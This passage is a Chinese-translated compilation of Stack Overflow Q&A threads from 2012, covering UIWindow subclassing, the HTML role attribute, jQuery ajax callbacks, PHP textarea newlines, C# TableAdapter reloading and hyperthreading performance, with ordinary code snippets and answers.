如果失败，则打开 Debug Malloc 并使用我博客中链接的工具来调试问题。

根据问题编辑：

你得到一个异常——在你提供的代码中，有几个 objectAtIndex 调用——使用这里的指令在异常上创建一个断点：

[http://www.dosomethinghere.com/2011/04/18/xcode-4-exception-breakpoint/](http://www.dosomethinghere.com/2011/04/18/xcode-4-exception-breakpoint/)

并告诉我们确切的路线。

基本上，您不能在空数组上调用 0 的 objectAtIndex ——因此您需要先检查长度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:15:28.497

在 iOS 中没有垃圾收集器功能。
相反，有 ARC（自动引用计数）
Apple 在此处讨论 ARC：[https](https://developer.apple.com/technologies/ios5/)
://developer.apple.com/technologies/ios5/ ARC 是编译器技术并使用保留计数来跟踪对象因此，最可能的原因是应用程序崩溃正在访问已释放的对象。这通常会导致编译器警告您访问不正确！在头文件中，确保使用
@property(nonatomic,retain)Object* myobject;正确保留您的对象。
希望这有帮助！

# iphone - 使用情节提要时继承 UIWindow

> ID：10403137
> 
> 赞同：31
> 
> 时间：2012-05-01T19:31:17.150
> 
> 标签：iphone, objective-c, ios, cocoa-touch, uiwindow

我有与这个问题中解释的相同的问题：

[在哪里可以将我的应用程序使用的窗口从 UIWindow 更改为我自己的带有情节提要的子类“MyWindow”？](https://stackoverflow.com/questions/7883886/where-can-i-change-the-window-my-app-uses-from-uiwindow-to-my-own-subclass-mywi)

我的问题是如何在我的应用程序委托中实现一个返回“MyWindow”子类的“window”getter 方法？或者也许还有其他方法可以将我的子类分配给我的应用程序的主窗口？

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2012-05-14T08:48:17.783

`UIWindow`在 Storyboard 项目中可以按照 Apple`UIApplicationDelegate`参考中的说明进行子类化：

> **窗口**
> 当使用情节提要时，应用程序必须通过将情节提要添加到窗口并将该窗口置于屏幕上来呈现情节提要。应用程序查询窗口的这个属性。此属性保留对窗口的引用对于防止窗口被释放是必要的。如果该属性的值为`nil`（默认值），则应用程序创建一个通用实例`UIWindow`并将其分配给该属性以供委托引用。您可以实现该协议的 getter 方法来为应用程序提供不同的窗口。

换句话说，在您的`AppDelegate`实现中只需添加以下 getter

**Objective-C**

```
- (MyCustomWindow *)window
{    
    static MyCustomWindow *customWindow = nil;
    if (!customWindow) customWindow = [[MyCustomWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    return customWindow;
} 
```

**迅速**

```
var customWindow: MyCustomWindow?    
var window: UIWindow? {
    get {
        customWindow = customWindow ?? MyCustomWindow(frame: UIScreen.mainScreen().bounds)
        return customWindow
    }
    set { }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-03-02T22:33:41.357

你要先继承 UIWindow 并不难

```
class WinCustom : UIWindow{ 
....
} 
```

然后在 AppDelegate 中：

```
func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {

    self.window = WinCustom(frame: UIScreen.main.bounds)

    self.window?.rootViewController = UIStoryboard(name: "Main", bundle: nil).instantiateInitialViewController()

    return true
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:16:14.397

在我自己的应用程序中，我在`window`从 Xcode 模板创建新应用程序时看到了在 AppDelegate.h 中声明的“”属性。

您可以修改该属性以在此时从“ `UIWindow`”更改为“” `MyWindow`。

或者，一个不太优雅的解决方案，您可以在访问它时简单地将它`window`的返回转换为 " `MyWindow`" 对象类型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-04-29T15:03:44.527

`UIApplicationDelegate`协议具有`window`您可以使用的属性

```
import UIKit

class CustomWindow : UIWindow {
    //...
} 
```

```
class AppDelegate: UIResponder, UIApplicationDelegate {

    var customWindow: CustomWindow?

    var window: UIWindow? {
        get {
            customWindow = customWindow ?? CustomWindow(frame: UIScreen.main.bounds)
            return customWindow
        }
        set { }
    }

    //...
} 
```

此解决方案仅返回一个自定义 UIWindow

[[设置界面窗口]](https://stackoverflow.com/a/61506795/4770877)

# html - HTML 中“角色”属性的用途是什么？

> ID：10403138
> 
> 赞同：1304
> 
> 时间：2012-05-01T10:11:45.550
> 
> 标签：html, optimization, seo, roles

我一直在一些人的工作中看到角色属性。我也用它，但我不确定它的效果。

例如：

```
<header id="header" role="banner">
    Header stuff in here
</header> 
```

或者：

```
<section id="facebook" role="contentinfo">
    Facebook stuff in here
</section> 
```

或者：

```
<section id="main" role="main">
     Main content stuff in here
</section> 
```

* * *

这个角色属性是必要的吗？

这个属性对语义更好吗？

它会改善 SEO 吗？

可以在[此处](https://www.w3.org/TR/xhtml-role/)找到角色列表，但我看到有些人自己编造。这是否允许或正确使用角色属性？

对此有什么想法吗？

* * *

## 回答 #1

> 赞同：1124
> 
> 时间：2013-09-06T18:12:29.183

您看到的大多数角色都被定义为 ARIA 1.0 的一部分，然后通过支持规范（如 HTML-AAM）并入 HTML。一些新的 HTML5 元素（对话框、主等）甚至基于原来的 ARIA 角色。

[http://www.w3.org/TR/wai-aria/](http://www.w3.org/TR/wai-aria/)

除了您的本机语义元素之外，还有一些使用角色的主要原因。

**原因 #1。**覆盖没有合适的宿主语言元素的角色，或者由于各种原因，使用了语义上不太合适的元素。

在这个例子中，使用了一个链接，尽管最终的功能比导航链接更像按钮。

```
<a href="#" role="button" aria-label="Delete item 1">Delete</a>
<!-- Note: href="#" is just a shorthand here, not a recommended technique. Use progressive enhancement when possible. --> 
```

屏幕阅读器用户会听到这是一个按钮（而不是链接），您可以使用 CSS 属性选择器来避免 class-itis 和 div-itis。

```
[role="button"] {
  /* style these as buttons w/o relying on a .button class */
} 
```

[7 年后更新：删除 * 选择器让一些评论者高兴，因为在 2020 年不需要属性选择器上需要通用选择器的旧浏览器怪癖。]

**原因 #2。**备份原生元素的角色，以支持实现了 ARIA 角色但尚未实现原生元素角色的浏览器。

例如，浏览器多年来一直支持“主要”角色，但它是 HTML5 相对较新的补充，因此许多浏览器还不支持`<main>`.

```
<main role="main">…&lt;/main> 
```

这在技术上是多余的，但可以帮助一些用户并且不会伤害任何用户。几年后，这种技术可能对 main 来说变得不必要了。

**原因#3。** 7 年后（2020 年）更新：正如至少一位评论者指出的那样，这现在对自定义元素非常有用，并且正在进行一些规范工作以定义 Web 组件的默认可访问性角色。即使/一旦该 API 标准化，也可能需要覆盖组件的默认角色。

**注意/回复**

你还写道：

> 我看到有些人自己编的。这是否允许或正确使用角色属性？

除非不包括真正的角色，否则这是允许使用该属性的。浏览器将应用令牌列表中第一个识别的角色。

```
<span role="foo link note bar">...</a> 
```

在列表之外，只有`link`和`note`是有效角色，因此链接角色将应用在平台可访问性 API 中，因为它先出现。如果您使用自定义角色，请确保它们不会与 ARIA 中定义的任何角色或您使用的宿主语言（HTML、SVG、MathML 等）冲突

* * *

## 回答 #2

> 赞同：167
> 
> 时间：2012-05-01T13:10:11.467

据我了解，角色最初是由 XHTML 定义的，但已被弃用。但是，它们现在由 HTML 5 定义，请参见此处：[https ://www.w3.org/WAI/PF/aria/roles#abstract_roles_header](https://www.w3.org/WAI/PF/aria/roles#abstract_roles_header)

角色属性的目的是向解析软件识别元素（及其子元素）作为 Web 应用程序的一部分的确切功能。这主要是作为屏幕阅读器的可访问性，但我也可以认为它对嵌入式浏览器和屏幕抓取器很有用。为了对不寻常的 HTML 客户端有用，该属性需要设置为我链接的规范中的角色之一。如果你自己编，这个“未来”的功能就不能工作——评论会更好。

这里的实用性：[http ://www.accessibleculture.org/articles/2011/04/html5-aria-2011/](http://www.accessibleculture.org/articles/2011/04/html5-aria-2011/)

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2016-10-13T07:36:49.457

> 这个角色属性是必要的吗？

答：**是**的。

*   当语言没有定义自己的角色属性时，角色属性是支持可访问富 Internet 应用程序[( **WAI-ARIA** )在基于 XML 的语言中定义角色所必需的。](https://en.wikipedia.org/wiki/WAI-ARIA)
*   虽然这是角色属性由**协议和格式工作组**发布的原因，但该属性也有更一般的用例。

它为您提供：

*   可访问性
*   设备适配
*   服务器端处理
*   复杂的数据描述，...等。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2018-10-18T08:08:22.303

我意识到这是一个老问题，但根据您的确切要求，另一个可能的考虑因素是在[https://validator.w3.org/](https://validator.w3.org/)上进行验证会生成如下警告：

> 警告：元素表单不需要表单角色。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-08-05T12:15:57.560

角色属性主要提高使用屏幕阅读器的人的可访问性。对于几种情况，我们会使用它，例如可访问性、设备适配、服务器端处理和复杂数据描述。了解更多点击：[https](https://www.w3.org/WAI/PF/HTML/wiki/RoleAttribute) ://www.w3.org/WAI/PF/HTML/wiki/RoleAttribute 。

# android - 从 android 调用 .net Web 服务时由对等方重置连接

> ID：10403142
> 
> 赞同：0
> 
> 时间：2012-05-01T19:31:32.843
> 
> 标签：android

我开发了一个简单的 android 应用程序，它使用 ksoap2-android 库版本 2.6.0 调用 .net Web 服务。问题是它有时会抛出“对等连接重置”异常。我无法弄清楚这个问题的原因，因为它是在使用 3G 网络时出现的。

提前致谢。

问候， Reem Al-Hanbali

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:34:45.893

我的猜测是连接中断，移动连接可能不稳定。我会去实现优雅的错误处理，看看是否有帮助。

# sql-server-2008 - PowerBuilder 9 看到每个用户有 100 个 SQL 进程

> ID：10403145
> 
> 赞同：0
> 
> 时间：2012-05-01T19:31:51.473
> 
> 标签：sql-server-2008, connection-pooling, powerbuilder

下午好，也许有人可以提供一些启示，或者至少为我指明方向，以弄清楚为什么 PowerBuilder 9 应用程序会导致在我们的 SQL 服务器数据库中打开 100 个数据库连接。

**背景**

我们的组织最近收购了另一家公司，该公司的主要应用程序是使用 PowerBuilder 9 构建的，该 PowerBuilder 9 位于 SQL Server 2008 R2 数据库之上。此应用程序的用户使用他们的域凭据登录数据库，他们大约有 15-20 个活跃用户。我们已经看到，在任何给定时刻，这 15-20 个用户可以在 SQL Server 数据库中运行 100 个连接/进程。

**例子**

例如，昨天有大约 530+/- 来自这些用户的数据库连接。对 sys.sysprocesses 表运行查询时，我可以看到所有连接的状态为“睡眠”，cmd 值为“AWAITING COMMAND”。

我们不确定这是否是由于开发人员未正确打开和关闭连接造成的，或者这对于 PowerBuilder 9 应用程序是否正常。

任何信息都会有所帮助和赞赏。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T04:11:30.217

您似乎想得到一个答案，表明 PowerBuilder 会本机地做一些非常愚蠢的事情。对不起，在这种情况下你不会得到它，我不认为。像任何工具一样，您*可以*让 PowerBuilder 应用程序做很多事情。如果PowerBuilder 的性质和基础架构驱使您选择一种架构，那么它*就是*一个单线程、单连接的应用程序。

我*可以*使应用程序多线程，并从每个线程连接（线程不能共享连接），但是这方面的文档不强，而且方法很迟钝，所以不太可能。

我*可以*让应用程序连接到数据库 1000 次，但这意味着超越内置的单个全局连接对象并实例化 1000 个新连接。这在如何做上比多线程更明显，但我不得不问为什么有人会这样编程？

这里有另一个想法：如果这个应用程序自 2003 年左右（PB9 的发布）就已经存在，为什么现在才出现呢？一个建议是，也许它与几年后出现的 DBMS 引擎相匹配？我知道有人成功地使用了带有更高版本 DBMS 引擎的 PowerBuilder 版本，但是很可能你偶然发现了一些不兼容的东西，这在 PB9 的开发时是不可预测的。

如果您的下一步不是很多追踪，试图弄清楚发生了什么，我会感到惊讶。SQL Server 具有出色的跟踪工具。PowerBuilder 有它自己[的跟踪数据库连接的能力](http://infocenter.sybase.com/help/topic/com.sybase.dc37776_1150/html/connpb/CCJCDEGE.htm)，虽然它们不那么优雅，但它们非常准确地描述了 PowerBuilder 正在向 DBMS 客户端软件“翻墙”，并且正在返回。

祝你好运，

特里。

# windows-phone-7 - 模拟器上的wp7 bing地图

> ID：10403147
> 
> 赞同：-1
> 
> 时间：2012-05-01T19:31:55.023
> 
> 标签：windows-phone-7

我正在尝试使用 GeoCoordinateWatcher、位置服务 api 在我的 wp7 模拟器上获取 bing 地图上的任何位置。但是我的程序无法返回坐标。我了解到位置服务api需要一个真实的设备才能工作，模拟器不返回任何位置数据。有没有办法在我的模拟器中做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:07:24.377

您可以单击模拟器中的箭头来查看这些工具（位置选项卡）：

![在此处输入图像描述](../Images/e8490e8c34ab3cbd39c9ff45f3a90145.png)

# c# - 使用 TableAdapter 重新加载数据

> ID：10403150
> 
> 赞同：4
> 
> 时间：2012-05-01T19:32:10.503
> 
> 标签：c#, sql, winforms, dataset, dataadapter

```
private void UserList_Load(object sender, EventArgs e)
{
    // TODO: This line of code loads data into the 'workOrdersDataSet.users' table. You can move, or remove it, as needed.
    this.usersTableAdapter.Fill(this.workOrdersDataSet.users);
} 
```

如果以其他形式进行了更改，我如何重新加载数据？（最好自动不使用刷新按钮）？

我正在使用 WinForms，后端是 Access 2007。

使用 Designer 将数据绑定到 Datagrid

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:12:57.677

首先，我会将 移动`Fill`到一个单独的函数：

```
public void LoadData()
{
   this.usersTableAdapter.Fill(this.workOrdersDataSet.users);
} 
```

然后，当您执行加载事件时，您将调用该函数：

```
private void UserList_Load(object sender, EventArgs e)
{
   LoadData();
} 
```

如果您有另一个对数据执行更改的表单，您可以在另一个事件中调用此函数，类似于此。我`DialogResult`在我的代码中使用：

```
private void OpenOtherForm()
{
    DialogResult openForm = new OtherForm().ShowDialog();
    if(openForm == DialogResult.OK)
        LoadData();
} 
```

在更新过程完成后，在另一个表单的代码中，包含一行代码来告诉您的主表单进行更新：

```
private void PerformUpdate()
{
    try
    {
        // your update code goes here
        DialogResult = DialogResult.OK; // this is the line that tells your other form to refresh
    }
    catch (Exception ex)
    {
        DialogResult = DialogResult.Abort;
    }
} 
```

使用`DialogResult`then，告诉您的主窗体仅在实际发生更新时触发数据刷新。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:40:59.223

您可以将此行添加到另一个函数中，例如

```
public void MoveDataToUI()
{
   this.usersTableAdapter.Fill(this.workOrdersDataSet.users);
} 
```

在从偶数处理程序调用此函数之后，当有人以另一种形式更改某些内容时会引发此函数。

[活动教程](http://msdn.microsoft.com/en-us/library/aa645739%28v=vs.71%29.aspx)

# javascript - ajax中的jQuery删除属性

> ID：10403152
> 
> 赞同：6
> 
> 时间：2012-05-01T19:32:21.643
> 
> 标签：javascript, jquery

我有一个 ajax 调用，我禁用了一个复选框，然后我想在 ajax 完成后再次启用。但是我不能删除禁用后的属性。

```
$(function(){ // added
    $("input:checkbox").live("click", function(){

        var a_href = $(this).attr('id');
        var checked = $(this).attr('checked');
        if (checked == 'checked') {
            checked = 1;
        }else {
            checked = 0
        };

        $(this).parent().parent().after('<img class="loader" style="padding-botton:0 !important;" alt="" src="images/loaders/loader.gif">');
        $(this).attr('disabled','disabled');

        $.ajax( {
            type: "POST",
            url: "includes/featured.php",
            data: { id: a_href, value: checked, field: "main_feature" },
          success: function(data) {
            $('img.loader').fadeOut('slow',function(){$(this).remove()});
            $(this).removeAttr('disabled'); 
          }             
        }).done(function (data){
            }
        );

    return false; 

    });
}); // added 
```

我也试过：

```
.attr('disabled', false); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T19:35:39.723

您需要保存对的引用，`this`因为`this`在 ajax 回调中是 ajax 请求。

```
$("input:checkbox").live("click", function(){
    var $this = $(this);
    ...
    ...
    success: function(data) {
        $('img.loader').fadeOut('slow',function(){$(this).remove()});
        $this.removeAttr('disabled'); 
```

或设置`context`为`this`：

```
 $.ajax( {
        type: "POST",
        context: this, // <===============
        url: "includes/featured.php",
        data: { id: a_href, value: checked, field: "main_feature" },
      success: function(data) {
          // Now this is the checkbox!
        $('img.loader').fadeOut('slow',function(){$(this).remove()});
        $(this).removeAttr('disabled'); 
      } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T19:34:10.770

`this`在 AJAX 成功处理程序中不会是复选框。您需要先缓存该变量，然后才能在成功处理程序中使用它。还值得注意的是，最好在使用`prop`或`removeProp`删除属性时使用。试试这个：

```
$(function(){ // added
    $("input:checkbox").live("click", function(){
        var $checkbox = $(this);

        var a_href = $checkbox.attr('id');
        var checked = $checkbox.attr('checked');
        checked = (checked == "checked") ? 1 : 0;

        $checkbox.parent().parent().after('<img class="loader" style="padding-botton:0 !important;" alt="" src="images/loaders/loader.gif">');
        $checkbox.attr('disabled','disabled');

        $.ajax( {
            type: "POST",
            url: "includes/featured.php",
            data: { id: a_href, value: checked, field: "main_feature" },
            success: function(data) {
                $('img.loader').fadeOut('slow',function(){$(this).remove()});
                $checkbox.removeProp('disabled'); 
            }             
        }).done(function (data) {});

        return false;
    });
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-01T19:34:28.587

我不认为成功函数中的“这个”是你认为的那样。尝试在您的复选框的 ajax 范围之外设置一个变量，然后在成功函数中引用它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-01T19:35:36.197

`$(this)`当您尝试重新启用您的复选框时，您超出了范围。

`var newthis = $(this)`之后添加

`$("input:checkbox").live("click", function(){`

并将您的呼叫更改为删除“禁用”属性

`newthis.removeAttr('disabled');`

# dotnetnuke - DotNetNuke 单元测试工具和教程

> ID：10403156
> 
> 赞同：5
> 
> 时间：2012-05-01T19:32:49.007
> 
> 标签：dotnetnuke

在 dotnetnuke 应用程序中执行单元测试的标准、最佳实践方法是什么？我搜索了 SO 以及 dnn 网站，但找不到太多关于此的信息。我假设 dnn 有一些东西可以用来做单元测试，或者至少是一个可以插入的库。我在哪里可以找到更多信息？关于该主题的教程将是理想的，但任何资源都将受到赞赏。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-02T13:25:53.627

DotNetNuke 中没有太多关于测试的信息。作为一个基于 WebForms 的项目，它并没有引起社区中许多开发人员的强烈关注。

例如，您可以查看 DNN 源代码中的单元测试项目，其中使用了许多不同的方法。他们使用 MbUnit 和 Moq 进行单元测试，以及使用 Watin 测试 Web 前端。

制作可测试模块的主要技术是使用 WebForms MVP 集成，以便您拥有可测试的、松散耦合的 Presenter，您可以轻松地将依赖项注入其中。[在 codeplex 上](http://testdrivendnnmodule.codeplex.com/)有一个示例模块的开始，但它从未完全充实。但是，它的项目页面确实有一些很好的背景。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T16:02:39.117

对于数据驱动的单元测试方法，请注意以下几点：

*   为单元测试项目创建 app.config 文件，并从 DNN Web 应用的 web.config 中复制与“数据”、“缓存”相关的部分

*   在运行任何测试之前安装缓存提供程序： `ComponentFactory.InstallComponents(New ProviderInstaller("caching", GetType(CachingProvider)))`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-21T21:32:31.950

当单元测试数据驱动模块时：

*   如果需要，请务必添加核心 DNN 文件 + DotNetNuke.Instrumentation.dll + PetaPoco
*   在 app.config 中包含数据和缓存部分（从 DNN web.config 复制部分）
*   在调用 DataProvider 方法之前在代码中初始化数据和缓存提供程序：

    ComponentFactory.InstallComponents(new ProviderInstaller("data", typeof(DataProvider)), new ProviderInstaller("caching", typeof(CachingProvider)));

# java - 使我的图像可点击和评估

> ID：10403158
> 
> 赞同：0
> 
> 时间：2012-05-01T19:33:10.147
> 
> 标签：java, image, swing

我正在为班级创建一个记忆卡游戏，并试图弄清楚如何使我的图像可点击并在 Java 中进行评估。我在这里使用了之前的教程，但是我的图像是用数字命名的，所以它们可以随机化。

这给了我错误，我不明白为什么。

另外，如何为这些卡片创建某种评估方法，它们被命名为 0-8（0 是卡片的背面）？我知道它需要是某种布尔代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:10:47.303

将 a[`JButton`](http://docs.oracle.com/javase/7/docs/api/javax/swing/JButton.html)与`ActionListener`. 可以`Icon`为按钮中的各种条件设置一个，但如果这不适合任务，您可能只是`actionPerformed()`在侦听器的方法中更改它们。

[这个例子](https://stackoverflow.com/a/7360696/418556)展示了一些处理图像的技巧，这些技巧`JToggleButton`也适用于`JButton`- 删除图像周围的边框。

![](../Images/0cb9744231015c2eefa4c23492a9d34c.png)

# php - Textarea：按回车键创建新行

> ID：10403159
> 
> 赞同：2
> 
> 时间：2012-05-01T19:33:10.800
> 
> 标签：php, textarea

当我在 textarea 中按 enter 时，它会转到一个新行，但是在提交 textarea 时该新行不会显示。我该如何进行这项工作？它应该很简单，但从我搜索和尝试的结果来看，它失败了。

```
<textarea style="{ white-space:pre; }"; name="texts" rows="3" cols="40"></textarea>

$texts = $_POST['texts']; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T19:38:58.783

我认为您正在寻找该`nl2br()`功能。

[nl2br()](http://php.net/manual/en/function.nl2br.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:37:50.453

问题可能是新行出现了，但是您将其输出为 html，因此它不会保留该新行。当您输出为 html 时，您需要将换行符转换为中断标记。你可以这样做：

```
//editing per comment advice. Apparently this method shouldn't be used since it doesn't replace all possible newline representations, although I dont remember having an issue with it.
//$string = str_replace("\n", "<br />", $string);
//as others mentioned, this is better and easier:
$string = nl2br($string); 
```

也许我误解了这个问题，但这就是我从中得到的。

# ios - 动态添加项目到 UIScrollView

> ID：10403192
> 
> 赞同：1
> 
> 时间：2012-05-01T19:35:34.063
> 
> 标签：ios

我快疯了！我有以下代码，它没有向 UIScrollView 添加任何内容。在模拟器中渲染时的视图显示为完全白色。

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    // add scroll view to the view 

      self.scrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0,self.view.frame.size.height - 200,self.view.frame.size.width,110)];

    self.scrollView.contentSize = CGSizeMake(400, 80);
    [self.scrollView setScrollEnabled:YES];
    [self.scrollView setPagingEnabled:YES];

    NSArray *imageNames = [NSArray arrayWithObjects:@"kidontrike_4.png",@"mockup_car2.png",@"mockup_car1.png", nil];

    for(NSString *imageName in imageNames) 
    {
        UIImageView *imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:imageName]];

        imageView.frame = CGRectMake(0, 0, 100, 100);

        [self.scrollView addSubview:imageView];
    }

    [self.view addSubview:self.scrollView];

} 
```

更新 1：

由于某种原因，即使添加带有背景颜色的视图似乎也不会出现。我只看到一个白屏。

```
@property (nonatomic,weak)  UIScrollView *scrollView; 

- (void)viewDidLoad
{
    [super viewDidLoad];

    // add scroll view to the view 

      self.scrollView = [[UIScrollView alloc] initWithFrame:self.view.frame];

    self.scrollView.contentSize = CGSizeMake(80, 80);
    [self.scrollView setScrollEnabled:YES];
    [self.scrollView setPagingEnabled:YES];

    UIView *someView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 100, 100)];
    [someView setBackgroundColor:[UIColor greenColor]];

    [self.scrollView addSubview:someView];
    [self.view addSubview:self.scrollView];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:50:59.677

没有什么对我跳出来的。

这里有几件事要检查：

*   如果您注销，滚动视图的最后一帧是什么？
*   您将每个 imageView 添加到相同的确切位置，而不是偏移任何数量。
*   您正在创建的图像可能不存在。也许尝试使用具有不同背景颜色的简单视图？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-09T06:17:04.903

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    // add scroll view to the view 

      self.scrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0,self.view.frame.size.height - 200,self.view.frame.size.width,110)];

    [self.view addSubview:self.scrollView];
    [self.scrollView setScrollEnabled:YES];
    [self.scrollView setPagingEnabled:YES];

    NSArray *imageNames = [NSArray arrayWithObjects:@"kidontrike_4.png",@"mockup_car2.png",@"mockup_car1.png", nil];
 UIImageView *imageView;
    for(NSString *imageName in imageNames) 
    {
       imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:imageName]];

        imageView.frame = CGRectMake(0, 0, 100, 100);

        [self.scrollView addSubview:imageView];
    }

   self.scrollView.contentSize = CGSizeMake(self.view.frame.size.width, imageView.frame.size.height+imageView.frame.origin.y+100);

} 
```

# arrays - MatLab - 结构和字段数组

> ID：10403194
> 
> 赞同：3
> 
> 时间：2012-05-01T19:35:37.850
> 
> 标签：arrays, matlab, structure, field

我正在自学MatLab。我有一个关于教科书中使用的字段示例的问题。我们定义：

```
FallSem.course = char('cs101','phy200','math211');
FallSem.prof = char('Turling','Fiegenbaum','Ramanjuan');
FallSem.score = [80 75 95; 72 75 78; 85 35 66]; 
```

我可以输入任何命令来显示所有内容`FallSem`吗？我知道如何访问不同字段中的数据（例如，我可以键入`FallSem.course(1,:)`以`cs101`显示），但如果我键入简单`FallSem`或`FallSem(1)`（`FallSem`是 1 x 1 结构），我得到的只是有关字段的一般信息，例如：

```
FallSem = 

    course: [3x7 char]
      prof: [3x10 char]
     score: [3x3 double] 
```

因此，如果有人知道任何可以让我显示所有数据的命令，我将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:48:23.133

AFAIK Matlab 中没有用于显示结构的内置函数，但您可以使用[此函数](http://www.mathworks.com/matlabcentral/fileexchange/13831-structure-display)。

# multithreading - 4 核的 8 个逻辑线程并行运行的速度最高可提高 4 倍？

> ID：10403201
> 
> 赞同：14
> 
> 时间：2012-05-01T19:35:52.337
> 
> 标签：multithreading, openmp, multicore, hyperthreading

*我正在对软件进行基准测试，该软件在 Intel 2670QM 上的执行速度比我使用所有 8 个“逻辑”线程的串行版本快 4 倍。我想要一些关于我对基准测试结果*的看法的社区反馈。

当我在 4 个内核上使用 4 个线程时，我的速度提高了 4 倍，整个算法是并行执行的。这对我来说似乎是合乎逻辑的，因为“阿姆达尔定律”预测了这一点。Windows 任务管理器告诉我我正在使用 50% 的 CPU。

但是，如果我在所有 8 个线程上执行相同的软件，我会再次得到 4 倍的加速，而*不是*8 倍的加速。

如果我理解正确的话：我的 CPU 有 4 个内核，频率分别为 2.2GHZ，但是当应用于 8 个“逻辑”线程时，频率分为 1.1GHZ，其余组件（如缓存内存）也是如此? 如果这是真的，那么为什么任务管理器声称我的 CPU 只使用了 50%？

```
#define NumberOfFiles 8
...
char startLetter ='a';
#pragma omp parallel for shared(startLetter)
for(int f=0; f<NumberOfFiles; f++){
    ...
} 
```

我不包括使用磁盘 I/O 的时间。我只对 STL 调用所需的时间（STL 排序）感兴趣，而不是磁盘 I/O。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-01T20:00:20.693

[i7-2670QM](http://ark.intel.com/products/53469)处理器有 4 个内核。但它可以并行运行 8 个线程。这意味着它只有 4 个处理单元（核心），但硬件支持并行运行 8 个线程。这意味着在核心上最多运行四个作业，如果其中一个作业由于例如内存访问而停止，另一个线程可以非常快速地开始在空闲核心上执行而几乎没有损失。[阅读有关超线程](http://en.wikipedia.org/wiki/Hyper-threading)的更多信息。在现实中，很少有超线程能够大幅提升性能的场景。更现代的处理器比旧处理器更好地处理超线程。

您的基准测试表明它受 CPU 限制，即管道中几乎没有停滞，这会给超线程带来优势。50% CPU 是正确的，其中 4 个内核正在工作，而额外的 4 个内核没有做任何事情。在 BIOS 中打开超线程，您将看到 100% CPU。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-01T19:45:08.923

这是超线程的快速总结

线程切换很慢，必须停止执行，将一堆值复制到内存中，将一堆值从内存中复制到 CPU 中，然后用新线程重新开始。

这就是你的 4 个虚拟内核的用武之地。你有 4 个内核，就是这样，但超线程允许 CPU 做的是在一个内核上有 2 个线程。

一次只能执行 1 个线程，但是当 1 个线程需要停止执行内存访问、磁盘访问或其他需要一些时间的操作时，它可以切换到另一个线程并运行一段时间。在旧处理器上，这段时间他们基本上睡了一会儿。

因此，您的四核有 4 个内核，每个内核一次可以做一件事，但是当他们需要在计算机的另一部分等待时，可以有第二个工作处于待机状态。

如果您的任务有大量内存使用和大量 CPU 使用，您应该会看到总执行时间略有减少，但如果您几乎完全受 CPU 限制，您最好坚持使用 4 个线程

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-05-01T20:00:08.340

这里要理解的重要信息是物理线程和逻辑线程之间的区别。
如果您的 CPU 上有 4 个物理内核，这意味着您有物理资源可以并行执行 4 个不同的执行线程。因此，如果您的线程没有数据争用，与单线程的速度相比，您通常可以测量出 x4 的性能提升。
我还假设操作系统（或您:)）正确设置了线程关联，因此每个线程都在每个物理核心上运行。
当您在 CPU 上启用 HT（超线程）时，核心频率不会被修改。:)那**部分**
会发生什么**硬件管道的一部分（在核心内部和周围（非核心、缓存等））是重复的，但它的一部分仍然在逻辑线程之间共享。这就是您不测量 x8 性能提升的原因。根据我启用所有逻辑核心的经验，您可以获得每个物理核心 x1.5 - x1.7 的性能提升，具体取决于您正在执行的代码、缓存使用情况（请记住，L1 缓存在两个逻辑核心/1 个物理核心之间共享，例如）、线程亲和性等等。希望这可以帮助。**

 *** * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-04T11:41:59.923

HT 在大多数 BIOS 中称为 SMT（同时多线程）或 HTT（超线程技术）。HT 的效率取决于所谓的计算与获取比率，即您的代码在从慢速主内存或 I/O 内存中获取或存储之前执行了多少内核（或寄存器/缓存）操作。对于高速缓存效率和 CPU 密集型代码，HT 几乎没有提供明显的性能提升。对于更多的内存绑定代码，由于所谓的“延迟隐藏”，HT 可以真正使执行受益。这就是为什么大多数非 x86 服务器 CPU 为每个内核提供 4（例如 IBM POWER7）到 8（例如 UltraSPARC T4）硬件线程。这些 CPU 通常用于数据库和事务处理系统，在这些系统中一次处理许多并发的内存绑定请求。

